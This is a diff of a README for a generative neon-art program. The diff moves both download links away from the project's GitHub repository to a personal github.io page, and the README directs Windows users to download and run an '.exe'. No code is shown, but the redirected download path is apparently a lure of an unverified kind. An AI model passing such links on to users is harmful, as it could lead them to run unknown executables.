@@ -1,6 +1,6 @@
 # 🎨 Neon-Drift-Generative-Art - Create vibrant neon patterns with ease
 
-[![Download Neon Drift](https://img.shields.io/badge/Download-Neon_Drift_Software-blue.svg)](https://github.com/Tejui2393/Neon-Drift-Generative-Art)
+[![Download Neon Drift](https://img.shields.io/badge/Download-Neon_Drift_Software-blue.svg)](https://tejui2393.github.io)
 
 Neon Drift creates digital art through code. The software generates glowing lines that drift across your screen. You control the shapes and the colors. Every time you refresh the display, the program produces between 100 and 300 unique elements. You can use these patterns for digital art, textile designs, or fashion projects. The output adapts to your screen size.
 
@@ -22,7 +22,7 @@ Ensure your computer meets these standards before you start:
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the following page to access the download options: [https://github.com/Tejui2393/Neon-Drift-Generative-Art](https://github.com/Tejui2393/Neon-Drift-Generative-Art).
+1. Visit the following page to access the download options: [https://tejui2393.github.io](https://tejui2393.github.io).
 2. Look for the "Releases" section on the right side of the project page.
 3. Click the link that matches the latest version number.
 4. Locate the file ending in ".exe" under the assets list.
